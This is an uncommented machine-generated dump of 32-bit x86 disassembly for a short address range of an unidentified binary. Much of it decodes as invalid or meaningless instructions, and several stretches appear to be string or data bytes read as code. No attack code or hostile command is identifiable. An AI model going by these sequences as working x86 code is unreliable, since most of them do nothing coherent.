  433253:	test   DWORD PTR [eax],eax
  433255:	clc    
  433256:	dec    ebp
  433257:	inc    ebp
  433258:	xor    edi,DWORD PTR [edi+ecx*1]
  43325b:	pushf  
  43325c:	ror    BYTE PTR [ebp+0x4dc1d0cb],0x84
  433263:	lea    eax,[ecx]
  433265:	int3   
  433266:	add    BYTE PTR [ebp+0x45],cl
  433269:	lea    ecx,[ebx-0x75b2cc38]
  43326f:	lea    eax,ds:0x4d72c4
  433275:	mov    ecx,DWORD PTR [ebp-0x4]
  433278:	xor    ecx,edi
  43327a:	bswap  ebx
  43327c:	ror    BYTE PTR [ebp-0x35],0xe9
  433280:	rol    DWORD PTR [ecx],0x84
  433283:	add    BYTE PTR [ecx],al
  433285:	xor    eax,DWORD PTR [eax]
  433287:	pushf  
  433288:	inc    ebp
  433289:	jnp    0x8a43668c
  43328f:	mov    eax,DWORD PTR ds:0xcf72e8
  433295:	lock dec ebp
  433297:	retf   
  433298:	xor    ecx,DWORD PTR [ebp+0xf]
  43329b:	mov    eax,eax
  43329d:	fmul   st,st(3)
  43329f:	test   ecx,0x19b8484
  4332a5:	xor    al,BYTE PTR [eax]
  4332a7:	mov    DWORD PTR [ebp-0x28],eax
  4332aa:	mov    eax,DWORD PTR [ebp+0x33]
  4332ad:	mov    ecx,DWORD PTR [edx+0x72c705d8]
  4332b3:	ret    
  4332b4:	add    al,cl
  4332b6:	dec    ebp
  4332b7:	adc    ecx,DWORD PTR [ebx-0x75ccccbb]
  4332bd:	add    ecx,DWORD PTR ds:0xc7250
  4332c3:	inc    ebp
  4332c4:	rcl    DWORD PTR [eax+0x4d],0x2b
  4332c8:	mov    edi,edi
  4332ca:	xor    ecx,DWORD PTR [ebx+0xde48a]
  4332d0:	jb     0x433299
  4332d2:	add    BYTE PTR [ecx+eax*8-0x74cdb2b5],al
  4332d9:	mov    esi,DWORD PTR [ebx]
  4332db:	cld    
  4332dc:	mov    cl,bh
  4332de:	or     eax,0x372b6
  4332e3:	cmp    ecx,eax
  4332e5:	jne    0x433362
  4332eb:	mov    eax,DWORD PTR [ebp-0x20]
  4332ee:	mov    eax,DWORD PTR [eax]
  4332f0:	xor    eax,edi
  4332f2:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4332f9:	mov    ecx,DWORD PTR [ebp-0x4]
  4332fc:	mov    ecx,edi
  4332fe:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433304:	jb     0x433315
  433306:	add    BYTE PTR [edi-0x3f],dl
  433309:	add    BYTE PTR [ebp-0x75],cl
  43330c:	mov    esi,eax
  43330e:	xor    eax,DWORD PTR [eax]
  433310:	mov    al,bh
  433312:	or     eax,0x4b7284
  433317:	xor    al,cl
  433319:	mov    ecx,DWORD PTR [ebp-0x4]
  43331c:	mov    ecx,edi
  43331e:	xor    esi,DWORD PTR [esi+0x3b0d038a]
  433324:	jb     0x433335
  433326:	add    BYTE PTR [edi],dh
  433328:	enter  0x8500,0x8b
  43332c:	add    ah,bl
  43332e:	add    BYTE PTR [eax],al
  433330:	inc    ebp
  433331:	(bad)  
  433332:	mov    eax,DWORD PTR [ebx+esi*1+0x5328a4b]
  433339:	mov    esi,DWORD PTR [edx-0x4]
  43333c:	add    bh,cl
  43333e:	dec    ebp
  43333f:	mov    dh,0x8b
  433341:	add    esi,DWORD PTR [ebx]
  433343:	cmp    ecx,DWORD PTR [edx+0x72170d0f]
  433349:	add    BYTE PTR [eax],al
  43334b:	mov    eax,ecx
  43334d:	loopne 0x43339c
  43334f:	add    BYTE PTR [ebx-0x757bcc39],cl
  433355:	dec    ebx
  433356:	or     eax,0x8b7232
  43335b:	in     al,0xc1
  43335d:	or     DWORD PTR [ebp-0x31],ecx
  433360:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4b]
  433367:	xor    dh,BYTE PTR [edx-0x75]
  43336a:	add    al,dh
  43336c:	enter  0x4f09,0xcf
  433370:	inc    ebp
  433371:	mov    WORD PTR [ebx-0x75cdccb5],cs
  433377:	or     al,BYTE PTR ds:0xe4728b
  43337d:	or     DWORD PTR [ebp-0x31],ecx
  433380:	mov    ecx,DWORD PTR [ebx+esi*1+0xd328a4f]
  433387:	cmp    dh,BYTE PTR [edx+0xf]
  43338a:	add    bl,dl
  43338c:	rol    DWORD PTR [eax],0x4d
  43338f:	mov    ecx,DWORD PTR [ebx-0x75ffcc10]
  433395:	(bad)  
  433396:	or     eax,0x4b7284
  43339b:	xor    al,cl
  43339d:	mov    ecx,DWORD PTR [ebp-0x20]
  4333a0:	mov    ecx,DWORD PTR [ecx]
  4333a2:	xor    ecx,edi
  4333a4:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724b]
  4333ab:	xor    cl,al
  4333ad:	mov    ecx,DWORD PTR [edi]
  4333af:	fadd   QWORD PTR [ebp+0x9]
  4333b2:	call   0xffd02e86
  4333b7:	dec    ebx
  4333b8:	dec    ebp
  4333b9:	xor    bh,BYTE PTR [ebx]
  4333bb:	or     dh,BYTE PTR [ebx+ecx*4-0x75]
  4333bf:	loopne 0x4333bd
  4333c1:	or     edi,eax
  4333c3:	iret   
  4333c4:	ret    
  4333c5:	mov    WORD PTR [ebp+0x4f],es
  4333c8:	mov    esi,DWORD PTR [edx]
  4333ca:	call   0x8452fb09
  4333cf:	(bad)  
  4333d0:	fwait
  4333d1:	add    BYTE PTR [edx],dh
  4333d3:	mov    esi,DWORD PTR [ebx]
  4333d5:	fmul   QWORD PTR [ebx+0x55c7fc00]
  4333db:	test   BYTE PTR [ebx],dh
  4333dd:	dec    ebx
  4333de:	add    esi,DWORD PTR [edx]
  4333e0:	cmp    ecx,DWORD PTR [ebx+0x9f8f00f]
  4333e6:	dec    edi
  4333e8:	mov    ecx,DWORD PTR [esp+edi*8+0x33324d4b]
  4333ef:	xor    al,BYTE PTR [ebx]
  4333f1:	mov    edi,DWORD PTR [ebx]
  4333f3:	in     al,0x75
  4333f5:	or     DWORD PTR [ebx+0x4d8ce8cf],ecx
  4333fb:	dec    ebx
  4333fc:	xor    esi,DWORD PTR [edx]
  4333fe:	lea    ecx,[edx]
  433400:	or     BYTE PTR [ebx+0x900f072],cl
  433406:	ja     0x4333d7
  433408:	sbb    BYTE PTR [ebp+esi*2-0x67cd72b1],cl
  43340f:	cmp    ch,al
  433411:	jne    0x433406
  433413:	mov    edi,edi
  433415:	fadd   QWORD PTR [ebp+0x0]
  433418:	mov    eax,edi
  43341a:	fadd   DWORD PTR [edi+eax*8-0x3ecd3cb5]
  433421:	mov    edx,DWORD PTR [ebx]
  433423:	in     al,0x45
  433425:	or     DWORD PTR [ebx],esi
  433427:	iret   
  433428:	add    ecx,DWORD PTR [eax+edx*2+0x4532184b]
  43342f:	xor    dl,BYTE PTR [eax-0x75]
  433432:	sbb    al,0xe0
  433434:	dec    DWORD PTR [ecx]
  433436:	mov    ecx,edi
  433438:	in     al,dx
  433439:	mov    eax,es
  43343b:	dec    ebx
  43343c:	mov    DWORD PTR [edx],esi
  43343e:	fmul   QWORD PTR [edx]
  433440:	jne    0x4333cd
  433442:	(bad)  
  433443:	(bad)  
  433445:	or     DWORD PTR [ebp-0x31],eax
  433448:	add    ecx,DWORD PTR [eax+ecx*1-0xccd17b1]
  43344f:	cmp    bh,bh
  433451:	jne    0x433498
  433453:	lea    ecx,[ebx-0x38372750]
  433459:	inc    ebx
  43345b:	mov    eax,ecx
  43345d:	mov    eax,0xa00c111
  433462:	jne    0x4334a9
  433464:	mov    esi,DWORD PTR [ebx]
  433466:	test   al,0x3
  433468:	inc    ebp
  433469:	mov    DWORD PTR [eax-0xc],edx
  43346c:	loop   0x4334b3
  43346e:	push   DWORD PTR [ebx]
  433470:	mov    ecx,DWORD PTR [ebp+0x724d3010]
  433476:	add    DWORD PTR [eax],eax
  433478:	mov    eax,edi
  43347a:	lods   al,BYTE PTR ds:[esi]
  43347b:	dec    ebp
  43347c:	inc    ebp
  43347d:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  433483:	retf   
  433484:	mov    edx,ecx
  433486:	adc    al,0x84
  433488:	(bad)  
  433489:	std    
  43348a:	ret    
  43348b:	jmp    FWORD PTR [edi-0x2b7474bb]
  433491:	hlt    
  433492:	rol    edi,0x82
  433495:	ret    
  433496:	cld    
  433497:	enter  0x11ff,0x45
  43349b:	inc    ebp
  43349c:	pop    edi
  43349d:	mov    ebx,DWORD PTR [ebx+0x14]
  4334a0:	ret    0xc7
  4334a3:	test   BYTE PTR [ebx+0x4532519b],cl
  4334a9:	jmp    0x433436
  4334ab:	push   0x8
  4334ad:	call   DWORD PTR [esi]
  4334af:	in     al,dx
  4334b0:	add    BYTE PTR [ebp+0x1],0x50
  4334b4:	add    bh,ah
  4334b6:	add    bh,bh
  4334b8:	icebp  
  4334b9:	mov    ecx,DWORD PTR [eax]
  4334bb:	cld    
  4334bc:	pop    es
  4334bd:	dec    ebp
  4334be:	shl    DWORD PTR [ebx],0x72
  4334c1:	add    eax,DWORD PTR [eax]
  4334c3:	cmp    edx,ecx
  4334c5:	je     0x4334d7
  4334c7:	mov    esi,DWORD PTR [ebp-0x4]
  4334ca:	inc    edi
  4334cc:	or     al,0xc3
  4334ce:	jmp    FWORD PTR [edx-0x18]
  4334d1:	(bad)  
  4334d2:	sti    
  4334d3:	cwde   
  4334d4:	(bad)  
  4334d5:	call   0xffa12de0
  4334da:	or     al,0x45
  4334dc:	push   ebp
  4334dd:	sub    esp,0x18
  4334e0:	push   ebx
  4334e1:	inc    ebp
  4334e2:	mov    edi,edi
  4334e4:	mov    ebp,DWORD PTR [eax+ecx*1+0x578b4d75]
  4334eb:	test   al,0x54
  4334ed:	inc    ebp
  4334ee:	push   ecx
  4334ef:	push   eax
  4334f0:	xor    ebp,DWORD PTR [ebx-0x748d0041]
  4334f6:	add    ah,bh
  4334f8:	(bad)  
  4334f9:	dec    ebp
  4334fa:	add    DWORD PTR [ebx],esi
  4334fc:	inc    ebp
  4334fd:	add    ecx,DWORD PTR [ebx+0x74943b]
  433503:	push   0xffffff8b
  433505:	dec    DWORD PTR [ebx-0x7fbaeb54]
  43350b:	add    eax,DWORD PTR [ecx]
  43350d:	or     BYTE PTR [eax],al
  43350f:	call   0xff852d14
  433514:	mov    eax,DWORD PTR [ebp+0x14]
  433517:	mov    ecx,DWORD PTR [ecx+0x801ac]
  43351d:	inc    ebp
  43351e:	dec    ecx
  43351f:	add    ebp,DWORD PTR [edx+0x14]
  433522:	push   0x8b3045
  433527:	call   0x33ad829c
  43352c:	inc    DWORD PTR [ebx]
  43352e:	mov    DWORD PTR [edi],ecx
  433530:	mov    eax,ecx
  433532:	or     BYTE PTR [ebp-0x3d],cl
  433535:	cmp    eax,edi
  433537:	cmovne esp,DWORD PTR [ebx+ecx*4-0x1]
  43353c:	adc    BYTE PTR [ebx+0x5eff0845],cl
  433542:	adc    al,0xc9
  433544:	inc    ebp
  433545:	adc    BYTE PTR [eax+0x55],dl
  433548:	jne    0x433536
  43354a:	call   0xff5434da
  43354f:	dec    ebp
  433550:	inc    ebp
  433551:	mov    ecx,DWORD PTR [ebx+0x390338b]
  433557:	add    BYTE PTR [ebx],bh
  433559:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  43355d:	push   esp
  43355e:	or     al,0x51
  433560:	dec    ebp
  433561:	xor    DWORD PTR [ebx],0xf32039b
  433567:	cmp    eax,DWORD PTR [ebp+0x74]
  43356a:	mov    edi,edi
  43356c:	pop    edi
  43356d:	adc    BYTE PTR [ebx+0x75],bl
  433570:	ret    0x50
  433573:	mov    edx,DWORD PTR ss:[edi-0x7d]
  433577:	(bad)  
  433578:	clc    
  433579:	mov    esp,ebp
  43357b:	pop    ecx
  43357c:	mov    ecx,0xf80085c2
  433581:	mov    ecx,DWORD PTR [ecx+edx*2]
  433584:	push   esi
  433585:	push   esi
  433586:	(bad)  
  433587:	lock add DWORD PTR [ebp+0x44],eax
  43358b:	mov    edx,DWORD PTR [eax]
  43358d:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  433591:	or     BYTE PTR [edi+eax*1+0x51],dl
  433595:	ret    
  433596:	xor    ebx,DWORD PTR [ebx+0x37232be]
  43359c:	add    BYTE PTR [ecx+0x147c8bfe],cl
  4335a2:	or     al,0x80
  4335a4:	jge    0x4335a7
  4335a6:	mov    DWORD PTR [eax],eax
  4335a8:	and    al,0x8
  4335aa:	cmp    DWORD PTR [ebp+0x10],eax
  4335ad:	mov    edx,DWORD PTR [esi]
  4335af:	xchg   esp,eax
  4335b0:	dec    esp
  4335b1:	add    BYTE PTR [eax],dl
  4335b3:	mov    ecx,edx
  4335b5:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4335b9:	dec    ebp
  4335ba:	into   
  4335bb:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4335c1:	mov    edx,DWORD PTR [eax+0x14]
  4335c4:	das    
  4335c5:	add    al,0x45
  4335c7:	add    BYTE PTR [ebp+0x0],dh
  4335ca:	mov    edi,edi
  4335cc:	and    al,0x50
  4335ce:	mov    eax,DWORD PTR [eax]
  4335d0:	and    al,0xd1
  4335d2:	xor    eax,DWORD PTR [esi]
  4335d4:	lea    eax,[ebp+0x8]
  4335d7:	xor    esi,DWORD PTR [edx+0x3]
  4335da:	add    BYTE PTR [ecx+0x4510fc44],cl
  4335e0:	xor    ecx,DWORD PTR [ebx+0x75eb0c9c]
  4335e6:	or     DWORD PTR [ebp-0x7a03f0],0x541608f8
  4335f0:	cmp    al,0xff
  4335f2:	pushf  
  4335f3:	mov    edi,edi
  4335f5:	or     BYTE PTR [esi+ecx*1],cl
  4335f8:	jne    0x4335bd
  4335fa:	call   0xc35c6
  4335ff:	adc    BYTE PTR [ebp+eax*2+0xc],al
  433603:	mov    ebx,DWORD PTR [eax]
  433605:	adc    BYTE PTR [ebx+eax*8+0x14],dh
  433609:	mov    DWORD PTR [edi+ebp*4+0x10],0xff0175fc
  433611:	pop    esi
  433612:	and    al,0xc9
  433614:	and    al,0x10
  433616:	call   DWORD PTR [ebp-0x73]
  433619:	in     al,dx
  43361a:	jmp    esp
  43361c:	je     0x4335a1
  43361e:	call   DWORD PTR [eax]
  433620:	and    al,0x31
  433622:	call   0xffcd34c3
  433627:	and    al,0x44
  433629:	push   edi
  43362a:	or     al,0x41
  43362c:	pop    esi
  43362d:	mov    ebp,esp
  43362f:	and    al,0xc2
  433631:	mov    eax,DWORD PTR [eax]
  433633:	and    al,0x85
  433635:	mov    edx,0x733080e
  43363a:	jne    0x433636
  43363c:	test   DWORD PTR [ebx+0x3083275],ebx
  433642:	dec    DWORD PTR [ecx-0x74dbdb15]
  433648:	sbb    BYTE PTR [esp+edx*1],cl
  43364b:	jl     0x43364c
  43364d:	adc    al,0x24
  43364f:	dec    ebp
  433650:	mov    esi,DWORD PTR [ebp+0xc]
  433653:	mov    ecx,DWORD PTR [eax]
  433655:	and    al,0x39
  433657:	xor    ebx,DWORD PTR [ebx+ecx*4]
  43365a:	or     BYTE PTR [eax+edx*1],ah
  43365d:	add    eax,DWORD PTR [edi+ecx*1+0x4c24ca32]
  433664:	clc    
  433665:	jmp    0x433603
  433667:	adc    al,bh
  433669:	inc    esp
  43366a:	je     0x4336b8
  43366c:	and    al,0xc2
  43366e:	je     0x43360b
  433670:	mov    ecx,DWORD PTR [ecx+0x687d685d]
  433676:	dec    DWORD PTR [ecx+0x235fbf08]
  43367c:	sbb    al,0x10
  43367e:	add    BYTE PTR [esi+edi*1+0x10],cl
  433682:	add    BYTE PTR [ebx+0xb],dh
  433685:	adc    BYTE PTR [eax],al
  433687:	mov    WORD PTR ds:0x3d450010,?
  43368d:	adc    BYTE PTR [eax],al
  43368f:	add    DWORD PTR [eax+edx*1],esp
  433692:	add    BYTE PTR [edx+0x6],cl
  433695:	adc    BYTE PTR [eax],al
  433697:	sub    dx,WORD PTR [eax]
  43369a:	add    bh,dl
  43369c:	imul   edx,DWORD PTR [eax],0x10302300
  4336a2:	add    BYTE PTR [esi+0x7b001077],dl
  4336a8:	ss inc ebx
  4336aa:	add    BYTE PTR [edi+0x36],bh
  4336ad:	inc    ebx
  4336ae:	add    BYTE PTR [ebx-0x78ffbcca],al
  4336b4:	ss inc ebx
  4336b6:	add    BYTE PTR [ebx-0x70ffbcca],cl
  4336bc:	ss inc ebx
  4336be:	add    BYTE PTR [ebx-0x68ffbcca],dl
  4336c4:	ss inc ebx
  4336c6:	add    BYTE PTR [ebx-0x60ffbcca],bl
  4336cc:	ss inc ebx
  4336ce:	add    BYTE PTR [ebx-0x5fffbcca],ah
  4336d4:	adc    DWORD PTR [eax],edx
  4336d6:	add    BYTE PTR [ecx],cl
  4336d8:	jo     0x4336ea
  4336da:	add    BYTE PTR ds:0xd7001027,ch
  4336e0:	pop    eax
  4336e1:	adc    BYTE PTR [eax],al
  4336e3:	push   es
  4336e4:	adc    al,0x10
  4336e6:	add    BYTE PTR [esi+0x33001031],ah
  4336ec:	ins    BYTE PTR es:[edi],dx
  4336ed:	adc    BYTE PTR [eax],al
  4336ef:	jb     0x433730
  4336f1:	adc    BYTE PTR [eax],al
  4336f3:	shl    DWORD PTR [esi],cl
  4336f5:	inc    ebx
  4336f6:	add    bh,dl
  4336f8:	ss inc ebx
  4336fa:	add    bl,bl
  4336fc:	ss inc ebx
  4336fe:	add    bh,bl
  433700:	ss inc ebx
  433702:	add    bl,ah
  433704:	ss inc ebx
  433706:	add    bh,ah
  433708:	ss inc ebx
  43370a:	add    bl,ch
  43370c:	ss inc ebx
  43370e:	add    bh,ch
  433710:	ss inc ebx
  433712:	add    dh,cl
  433714:	jge    0x433726
  433716:	add    BYTE PTR [esi-0x3dffef8e],dl
  43371c:	or     dl,BYTE PTR [eax]
  43371e:	add    dh,bl
  433720:	sub    dl,BYTE PTR [eax]
  433722:	add    BYTE PTR [edx],bl
  433724:	ins    BYTE PTR es:[edi],dx
  433725:	adc    BYTE PTR [eax],al
  433727:	addr16 jno 0x43373a
  43372a:	add    BYTE PTR [ebp+0x3d],ch
  43372d:	adc    BYTE PTR [eax],al
  43372f:	lds    esp,FWORD PTR [eax+0x10]
  433732:	add    BYTE PTR [ebx],dl
  433734:	aaa    
  433735:	inc    ebx
  433736:	add    BYTE PTR [edi],dl
  433738:	aaa    
  433739:	inc    ebx
  43373a:	add    BYTE PTR [ebx],bl
  43373c:	aaa    
  43373d:	inc    ebx
  43373e:	add    BYTE PTR [edi],bl
  433740:	aaa    
  433741:	inc    ebx
  433742:	add    BYTE PTR [ebx],ah
  433744:	aaa    
  433745:	inc    ebx
  433746:	add    BYTE PTR [edi],ah
  433748:	aaa    
  433749:	inc    ebx
  43374a:	add    BYTE PTR [ebx],ch
  43374c:	aaa    
  43374d:	inc    ebx
  43374e:	add    BYTE PTR [edi],ch
  433750:	aaa    
  433751:	inc    ebx
  433752:	add    BYTE PTR [esp+edx*1],bh
  433755:	adc    BYTE PTR [eax],al
  433757:	clc    
  433758:	cmp    dl,BYTE PTR [eax]
  43375a:	add    BYTE PTR [ecx],ah
  43375c:	pop    ds
  43375d:	adc    BYTE PTR [eax],al
  43375f:	mov    edi,0x6001073
  433764:	adc    al,0x10
  433766:	add    BYTE PTR [ecx+0x34],bh
  433769:	adc    BYTE PTR [eax],al
  43376b:	cmp    edi,DWORD PTR [eax+edx*1+0x0]
  43376f:	shl    DWORD PTR [edx+0x10],1
  433772:	add    BYTE PTR [ebx+0x37],dl
  433775:	inc    ebx
  433776:	add    BYTE PTR [edi+0x37],dl
  433779:	inc    ebx
  43377a:	add    BYTE PTR [ebx+0x37],bl
  43377d:	inc    ebx
  43377e:	add    BYTE PTR [edi+0x37],bl
  433781:	inc    ebx
  433782:	add    BYTE PTR [ebx+0x37],ah
  433785:	inc    ebx
  433786:	add    BYTE PTR [edi+0x37],ah
  433789:	inc    ebx
  43378a:	add    BYTE PTR [ebx+0x37],ch
  43378d:	inc    ebx
  43378e:	add    BYTE PTR [edi+0x37],ch
  433791:	inc    ebx
  433792:	add    BYTE PTR [ebp+0x14],al
  433795:	adc    BYTE PTR [eax],al
  433797:	fwait
  433798:	pop    ds
  433799:	adc    BYTE PTR [eax],al
  43379b:	jnp    0x4337c0
  43379d:	adc    BYTE PTR [eax],al
  43379f:	pop    esi
  4337a0:	adc    BYTE PTR cs:[eax],al
  4337a3:	popf   
  4337a4:	jno    0x4337b6
  4337a6:	add    ah,bl
  4337a8:	inc    ebp
  4337a9:	adc    BYTE PTR [eax],al
  4337ab:	sbb    edx,DWORD PTR [edx+0x10]
  4337ae:	add    BYTE PTR [edx-0x6cffefd7],bl
  4337b4:	aaa    
  4337b5:	inc    ebx
  4337b6:	add    BYTE PTR [edi-0x64ffbcc9],dl
  4337bc:	aaa    
  4337bd:	inc    ebx
  4337be:	add    BYTE PTR [edi-0x5cffbcc9],bl
  4337c4:	aaa    
  4337c5:	inc    ebx
  4337c6:	add    BYTE PTR [edi-0x54ffbcc9],ah
  4337cc:	aaa    
  4337cd:	inc    ebx
  4337ce:	add    BYTE PTR [edi+0x54004337],ch
  4337d4:	xor    al,0x4b
  4337d6:	aaa    
  4337d7:	pop    edi
  4337d8:	inc    edx
  4337d9:	dec    ebx
  4337da:	xor    DWORD PTR [ecx],edi
  4337dc:	push   edi
  4337dd:	add    BYTE PTR [ecx+0x39],cl
  4337e0:	xor    al,0x5f
  4337e2:	pop    ecx
  4337e3:	inc    edi
  4337e4:	push   edx
  4337e5:	pop    edi
  4337e6:	dec    edx
  4337e7:	xor    al,BYTE PTR [edx+0x30]
  4337ea:	push   ebx
  4337eb:	add    BYTE PTR [ecx+0x4a],cl
  4337ee:	cmp    BYTE PTR [edi+0x38],bl
  4337f1:	xor    al,0x43
  4337f3:	xor    bl,BYTE PTR [eax+0x36]
  4337f6:	pop    edi
  4337f7:	inc    ebx
  4337f8:	add    BYTE PTR [edx+0x33],cl
  4337fb:	dec    ebp
  4337fc:	cmp    BYTE PTR [edi+0x53],bl
  4337ff:	xor    DWORD PTR [eax],edi
  433801:	pop    edx
  433802:	pop    edi
  433803:	xor    BYTE PTR [edx+0x52],cl
  433806:	inc    ecx
  433807:	add    BYTE PTR [edx+0x42],al
  43380a:	inc    ebp
  43380b:	pop    edi
  43380c:	cmp    DWORD PTR [eax],edi
  43380e:	push   ebp
  43380f:	inc    edx
  433810:	xor    eax,0x5244505f
  433815:	xor    BYTE PTR [eax],al
  433817:	inc    edx
  433818:	inc    esp
  433819:	inc    edx
  43381a:	cmp    DWORD PTR [edi+0x52],ebx
  43381d:	dec    esp
  43381e:	inc    ebp
  43381f:	add    BYTE PTR [ebx+0x37],dl
  433822:	push   esp
  433823:	xor    BYTE PTR [edi+0x55],bl
  433826:	push   ebx
  433827:	aaa    
  433828:	dec    ebp
  433829:	pop    edi
  43382a:	xor    ecx,DWORD PTR [edx+0x4e]
  43382d:	dec    ebx
  43382e:	add    BYTE PTR [edx+0x47],cl
  433831:	inc    edi
  433832:	xor    eax,0x534e5f32
  433837:	push   esp
  433838:	pop    edi
  433839:	push   esp
  43383a:	inc    edx
  43383b:	add    BYTE PTR [ebx+0x4d],al
  43383e:	xor    BYTE PTR [edi+0x47],bl
  433841:	cmp    DWORD PTR [ecx+0x5f],ebx
  433844:	push   eax
  433845:	push   ecx
  433846:	push   ecx
  433847:	pop    edi
  433848:	inc    ebx
  433849:	push   edi
  43384a:	push   esi
  43384b:	add    BYTE PTR [ecx+0x57],cl
  43384e:	inc    ebp
  43384f:	pop    edi
  433850:	pop    ecx
  433851:	push   edx
  433852:	inc    edx
  433853:	pop    edi
  433854:	inc    edi
  433855:	add    BYTE PTR [ebx+0x51],dl
  433858:	cmp    DWORD PTR ds:0x4d305f33,esi
  43385e:	inc    edi
  43385f:	xor    edx,DWORD PTR [edx+0x34]
  433862:	pop    edi
  433863:	pop    edx
  433864:	cmp    BYTE PTR [eax],al
  433866:	inc    edi
  433867:	xor    esi,DWORD PTR ds:0x5451585f
  43386d:	dec    esp
  43386e:	add    BYTE PTR [edi+esi*1+0x34],cl
  433872:	pop    edi
  433873:	cmp    BYTE PTR [edi+0x49],dl
  433876:	xor    eax,0x5700505f
  43387b:	cmp    DWORD PTR [edi+ebx*2+0x50],eax
  43387f:	dec    esi
  433880:	dec    edx
  433881:	cmp    BYTE PTR [eax],al
  433883:	pop    edx
  433884:	dec    ebx
  433885:	xor    eax,0x4f5f3131
  43388a:	xor    dh,BYTE PTR [ecx]
  43388c:	pop    edi
  43388d:	inc    ebp
  43388e:	push   esp
  43388f:	inc    esp
  433890:	inc    ebp
  433891:	add    BYTE PTR [edi+0x55],dl
  433894:	cmp    DWORD PTR [edi+0x5a],ebx
  433897:	push   edx
  433898:	inc    edi
  433899:	xor    DWORD PTR [ebp+0x0],ecx
  43389c:	pop    edx
  43389d:	dec    ecx
  43389e:	dec    ebp
  43389f:	ss pop edi
  4338a1:	pop    edx
  4338a2:	push   edx
  4338a3:	cmp    BYTE PTR [esi+0x30],dl
  4338a6:	pop    edi
  4338a7:	push   ecx
  4338a8:	dec    esi
  4338a9:	add    BYTE PTR [ebx+0x32],dl
  4338ac:	inc    ebx
  4338ad:	cmp    BYTE PTR [edi+0x52],bl
  4338b0:	dec    ecx
  4338b1:	xor    BYTE PTR [eax],al
  4338b3:	inc    edi
  4338b4:	xor    eax,0x314f5f4b
  4338b9:	xor    DWORD PTR [edi+0x38],ebx
  4338bc:	push   ebp
  4338bd:	add    BYTE PTR [edi+0x4b],al
  4338c0:	xor    bl,BYTE PTR [edi+0x43]
  4338c3:	push   ebp
  4338c4:	cmp    DWORD PTR [ebp+0x4b],ecx
  4338c7:	ss pop edi
  4338c9:	pop    edx
  4338ca:	push   edi
  4338cb:	inc    esp
  4338cc:	xor    BYTE PTR [eax],al
  4338ce:	dec    ecx
  4338cf:	inc    edi
  4338d0:	xor    eax,0x3058555f
  4338d5:	dec    ebx
  4338d6:	pop    edi
  4338d7:	push   edi
  4338d8:	add    BYTE PTR [eax+0x0],bl
  4338db:	inc    edi
  4338dc:	add    BYTE PTR [edx+0x0],al
  4338df:	pop    edi
  4338e0:	add    BYTE PTR [ebx],dh
  4338e2:	add    BYTE PTR [eax],bh
  4338e4:	add    BYTE PTR [ebx+0x0],cl
  4338e7:	xor    eax,0x33003500
  4338ec:	add    BYTE PTR [eax],dh
  4338ee:	add    BYTE PTR [edi+0x0],bl
  4338f1:	push   esp
  4338f2:	add    BYTE PTR [ebp+0x0],cl
  4338f5:	xor    BYTE PTR [eax],al
  4338f7:	add    BYTE PTR [eax],al
  4338f9:	inc    esi
  4338fa:	add    BYTE PTR [eax+0x0],bl
  4338fd:	xor    BYTE PTR [eax],al
  4338ff:	pop    edi
  433900:	add    BYTE PTR [ecx],dh
  433902:	add    BYTE PTR [ebx+0x0],al
  433905:	xor    eax,0x5f003100
  43390a:	add    BYTE PTR [ecx+0x0],al
  43390d:	xor    eax,DWORD PTR [eax]
  43390f:	add    BYTE PTR [eax],al
  433911:	push   ebx
  433912:	add    BYTE PTR [ebx+0x0],dl
  433915:	dec    eax
  433916:	add    BYTE PTR [edi+0x0],bl
  433919:	push   esp
  43391a:	add    BYTE PTR [ebx+0x0],al
  43391d:	push   ebx
  43391e:	add    BYTE PTR [edx+0x0],dl
  433921:	pop    edi
  433922:	add    BYTE PTR [ecx+0x0],dl
  433925:	dec    edi
  433926:	add    BYTE PTR [edi+0x0],al
  433929:	push   ecx
  43392a:	add    BYTE PTR [edi+0x0],bl
  43392d:	pop    ecx
  43392e:	add    BYTE PTR [eax],al
  433930:	add    BYTE PTR [edi+0x0],cl
  433933:	dec    edi
  433934:	add    BYTE PTR [ebp+0x0],dl
  433937:	cmp    DWORD PTR [eax],eax
  433939:	pop    edi
  43393a:	add    BYTE PTR [edx],dh
  43393c:	add    BYTE PTR [eax+eax*1+0x32],al
  433940:	add    BYTE PTR ds:0x47005f00,dh
  433946:	add    BYTE PTR ds:0x48000000,dh
  43394c:	add    BYTE PTR [edx+0x0],cl
  43394f:	push   eax
  433950:	add    BYTE PTR [edi+0x0],bl
  433953:	cmp    BYTE PTR [eax],al
  433955:	add    BYTE PTR ss:0x55004100,dh
  43395c:	add    BYTE PTR [edi+0x0],bl
  43395f:	push   edx
  433960:	add    BYTE PTR [edi],dh
  433962:	add    BYTE PTR [ecx+0x0],cl
  433965:	add    BYTE PTR [eax],al
  433967:	inc    esp
  433968:	add    BYTE PTR [ecx+0x0],dl
  43396b:	inc    edx
  43396c:	add    BYTE PTR [edi+0x0],bl
  43396f:	push   ecx
  433970:	add    BYTE PTR [ecx+0x0],bl
  433973:	dec    edi
  433974:	add    BYTE PTR [eax+0x0],dl
  433977:	add    BYTE PTR [eax],al
  433979:	dec    edx
  43397a:	add    BYTE PTR [ecx+0x0],dl
  43397d:	inc    esp
  43397e:	add    BYTE PTR [edi+0x0],bl
  433981:	dec    edx
  433982:	add    BYTE PTR [eax],dh
  433984:	add    BYTE PTR [ecx],dh
  433986:	add    BYTE PTR [ebx+0x0],dl
  433989:	push   ecx
  43398a:	add    BYTE PTR [ecx],dh
  43398c:	add    BYTE PTR [edi+0x0],bl
  43398f:	push   edi
  433990:	add    BYTE PTR [eax],al
  433992:	add    BYTE PTR [ebx+0x0],cl
  433995:	pop    edx
  433996:	add    BYTE PTR [esi],dh
  433998:	add    BYTE PTR [edi+0x0],bl
  43399b:	inc    ebx
  43399c:	add    BYTE PTR [eax+eax*1+0x5a],dl
  4339a0:	add    BYTE PTR [edi+0x0],bl
  4339a3:	push   edi
  4339a4:	add    BYTE PTR [ebx],dh
  4339a6:	add    BYTE PTR [esi+0x0],cl
  4339a9:	push   ebp
  4339aa:	add    BYTE PTR [edi+0x0],bl
  4339ad:	dec    edx
  4339ae:	add    BYTE PTR [eax],al
